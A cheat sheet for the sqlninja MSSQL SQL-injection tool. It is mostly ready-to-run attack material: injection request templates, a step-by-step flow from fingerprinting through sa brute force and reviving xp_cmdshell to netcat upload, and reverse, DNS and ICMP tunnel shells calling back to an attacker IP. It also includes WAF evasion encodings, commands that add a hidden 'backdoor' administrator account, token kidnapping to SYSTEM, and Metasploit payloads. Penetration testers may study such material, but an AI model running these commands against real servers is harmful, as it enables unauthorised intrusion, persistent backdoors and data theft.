# sqlninja CHEATSHEET

## Overview
MSSQL exploitation tool — fingerprint, escalate, upload, shell, tunnel, Metasploit integration.

## Quick Start

```bash
# 1. Create config file
nano ~/sqlninja.conf

# 2. Test injection
sqlninja -m t -f ~/sqlninja.conf

# 3. Fingerprint
sqlninja -m f -f ~/sqlninja.conf
```

## Minimal Config File

```
--httprequest_start--
GET http://TARGET/page.asp?id=1';__SQL2INJECT__-- HTTP/1.0
Host: TARGET
User-Agent: Mozilla/5.0
Connection: close
--httprequest_end--
lhost = ATTACKER_IP
device = eth0
```

## Attack Modes (Full List)

| Mode | Shortcut | Description |
|------|----------|-------------|
| test | t | Test if injection works |
| fingerprint | f | Fingerprint SQL Server version, user, privileges |
| bruteforce | b | Brute-force sa password (MSSQL 2000) |
| escalation | e | Add user to sysadmin role |
| resurrectxp | x | Recreate xp_cmdshell if disabled |
| upload | u | Upload binary file to target |
| dirshell | s | Direct/bind shell |
| backscan | k | Scan for open outbound ports |
| revshell | r | Reverse shell |
| dnstunnel | d | DNS-tunneled pseudoshell |
| icmpshell | i | ICMP-tunneled reverse shell |
| metasploit | m | Metasploit wrapper (Meterpreter/VNC) |
| sqlcmd | c | Blind OS command execution |
| getdata | g | Extract database content |

## Standard Attack Flow

```bash
# Step 1: Test
sqlninja -m t -f ~/sqlninja.conf

# Step 2: Fingerprint
sqlninja -m f -f ~/sqlninja.conf

# Step 3: Bruteforce (if not sysadmin, SQL Server 2000 only)
sqlninja -m b -f ~/sqlninja.conf -w /usr/share/wordlists/rockyou.txt

# Step 4: Resurrect xp_cmdshell (if disabled)
sqlninja -m x -f ~/sqlninja.conf

# Step 5: Upload netcat
sqlninja -m u -f ~/sqlninja.conf

# Step 6: Direct shell (if port reachable)
sqlninja -m s -f ~/sqlninja.conf

# OR: Find outbound port
sqlninja -m k -f ~/sqlninja.conf

# Step 7: Reverse shell
sqlninja -m r -f ~/sqlninja.conf
```

## Command-Line Flags

| Flag | Description | Example |
|------|-------------|---------|
| `-m <mode>` | Attack mode (required) | `-m t` |
| `-f <file>` | Config file | `-f /root/sqlninja.conf` |
| `-p <pass>` | sa password | `-p "P@ssw0rd"` |
| `-w <file>` | Wordlist for bruteforce | `-w rockyou.txt` |
| `-g` | Generate debug script only | `-m u -g` |
| `-v` | Verbose output | `-v` |
| `-d <level>` | Debug (1=SQL, 2=HTTP req, 3=HTTP resp, all) | `-d all` |

## Config File Options

### Basic

```
lhost = 192.168.1.2        # Attacker IP
device = eth0               # Network interface
proxyhost = 127.0.0.1       # HTTP proxy
proxyport = 8080            # Proxy port
domain = sqlninja.example.com  # DNS domain (for tunnel)
msfpath = /opt/metasploit/bin  # Metasploit path
evasion = 0                 # 0=none, 1234=all techniques
msfencoder = x86/shikata_ga_nai
upload_method = vbscript    # or "debug"
```

### Data Extraction

```
data_channel = time         # or "dns"
data_extraction = optimized # or "binary" or "serial"
blindtime = 5               # seconds for WAITFOR delay
language_map = english
language_map_adaptive = yes
```

### Advanced

```
appendcomment = yes         # Append -- after injection
usechurrasco = yes          # Wrap commands with churrasco.exe
xp_name = xp_cmdshell       # or custom name like "sp_sqlbackup"
```

## Evasion Techniques

| Value | Technique | Effect |
|-------|-----------|--------|
| 1 | Hex encoding | Entire query hex-encoded |
| 2 | Comment separators | Spaces → `/**/` |
| 3 | Random case | SQL keywords randomized case |
| 4 | URI encoding | Random percent-encoding |
| 1234 | All combined | Maximum obfuscation |

## Shell Options

### Direct Shell (dirshell)

```bash
sqlninja -m s -f ~/sqlninja.conf
# Prompts for: port, protocol (TCP/UDP)
```

### Reverse Shell (revshell)

```bash
sqlninja -m r -f ~/sqlninja.conf
# Prompts for: local port, protocol
# Requires lhost in config
```

### DNS Tunnel Shell

```bash
# Requires: root, domain configured, dnstun.exe uploaded
sudo sqlninja -m d -f ~/sqlninja.conf
# Commands execute, output via DNS queries
```

### ICMP Tunnel Shell

```bash
# Disable ICMP echo replies first:
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1

# Upload icmpsh.exe, then:
sqlninja -m i -f ~/sqlninja.conf
# Prompts: buffer size (64-1400), send delay, timeout
```

### Metasploit Shell

```bash
sqlninja -m m -f ~/sqlninja.conf
# Prompts: Meterpreter/VNC, direct/reverse, host/port
```

## Blind Commands (sqlcmd mode)

```bash
sqlninja -m c -f ~/sqlninja.conf
# Enter DOS commands directly:
whoami
net user backdoor P@ss123 /add
net localgroup administrators backdoor /add

# Verify via timing:
if exist c:\windows\win.exe (ping -n 5 127.0.0.1)
# 5 second delay = file exists
```

## Data Extraction

```bash
sqlninja -m g -f ~/sqlninja.conf
# Interactive: select DB → schema → table → column
# Output saved to session.db (SQLite)
```

### Time-Based

```
data_channel = time
data_extraction = binary      # Fewer requests, half trigger delay
data_extraction = optimized   # Most common chars first
data_extraction = serial      # ASCII order
```

### DNS-Based (Fast)

```
data_channel = dns
domain = sqlninja.example.com
```

## Installation

```bash
# Kali Linux
sudo apt install sqlninja

# Dependencies
sudo apt install perl libnet-pcap-perl libnet-dns-perl \
    libnet-rawip-perl libnetpacket-perl libio-socket-ssl-perl

# Verify
sqlninja --help
```

## Privilege Escalation

### sa Bruteforce (MSSQL 2000)

```bash
# Dictionary
sqlninja -m b -f ~/sqlninja.conf -w wordlist.txt

# Incremental (tries all char combos)
sqlninja -m b -f ~/sqlninja.conf
```

### Manual Escalation

```bash
sqlninja -m e -f ~/sqlninja.conf -p "sa_password"
```

### Token Kidnapping

```bash
# 1. Upload churrasco.exe
sqlninja -m u -f ~/sqlninja.conf

# 2. Set in config
usechurrasco = yes

# 3. All commands now run as SYSTEM
```

## HTTP Request Format

### GET Injection

```
--httprequest_start--
GET http://TARGET/page.asp?id=1';__SQL2INJECT__-- HTTP/1.0
Host: TARGET
Connection: close
--httprequest_end--
```

### POST Injection

```
--httprequest_start--
POST https://TARGET/page.asp HTTP/1.0
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Cookie: ASPSESSIONID=xxxxx

param=123';__SQL2INJECT__
--httprequest_end--
```

### Cookie Injection

```
--httprequest_start--
GET http://TARGET/page.asp HTTP/1.0
Host: TARGET
Cookie: session=xxxxx'%3B__SQL2INJECT__
Connection: close
--httprequest_end--
```

## Default Tools in sqlninja

| File | Purpose | Location |
|------|---------|----------|
| `netcat.exe` | Shell connection | `apps/` |
| `dnstun.exe` | DNS tunnel agent | `apps/` |
| `icmpsh.exe` | ICMP tunnel agent | `apps/` |
| `churrasco.exe` | Token kidnapping | `apps/` |
| `vdmallowed.exe` | CVE-2010-0232 exploit | `apps/` |
| `vdmexploit.dll` | CVE-2010-0232 DLL | `apps/` |

## Debugging

```bash
# Show injected SQL
sqlninja -m t -f ~/sqlninja.conf -d 1

# Show HTTP requests
sqlninja -m t -f ~/sqlninja.conf -d 2

# Show HTTP responses
sqlninja -m t -f ~/sqlninja.conf -d 3

# All debug output
sqlninja -m t -f ~/sqlninja.conf -d all

# Verbose
sqlninja -m t -f ~/sqlninja.conf -v
```

## Quick Reference

| Scenario | Mode | Notes |
|----------|------|-------|
| Test injection | `t` | First step always |
| Get server info | `f` | Version, user, privileges |
| Need sa password | `b` | MSSQL 2000 only |
| xp_cmdshell disabled | `x` | Recreate it |
| Upload tools | `u` | Netcat, dnstun, etc. |
| Direct access | `s` | If port reachable |
| Find outbound port | `k` | Before revshell |
| Reverse shell | `r` | Behind firewall |
| No TCP, DNS works | `d` | Slow but reliable |
| No TCP, ICMP works | `i` | Needs sysctl config |
| Want Meterpreter | `m` | Needs Metasploit |
| Blind command exec | `c` | Last resort |
| Extract data | `g` | Time or DNS channel |

## Troubleshooting

```bash
# Missing Perl modules
sudo apt install libnet-pcap-perl libnet-dns-perl libnet-rawip-perl libnetpacket-perl libio-socket-ssl-perl

# Injection test fails
# 1. Check HTTP request format (use HTTP/1.0)
# 2. Verify __SQL2INJECT__ placement
# 3. Test with curl manually

# Upload fails
# Switch to vbscript method: upload_method = vbscript

# DNS tunnel won't start
# Must run as root: sudo sqlninja -m d -f ~/sqlninja.conf

# Slow data extraction
# Switch to DNS: data_channel = dns
# Use binary search: data_extraction = binary

# Bruteforce fails (SQL 2005+)
# OPENROWSET disabled for non-admins — use getdata mode instead
```

## MITRE ATT&CK

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter | T1059 |
| Persistence | Server Software Component | T1505 |
| Privilege Escalation | Abuse Elevation Control Mechanism | T1548 |
| Exfiltration | Exfiltration Over Alternative Protocol | T1048 |
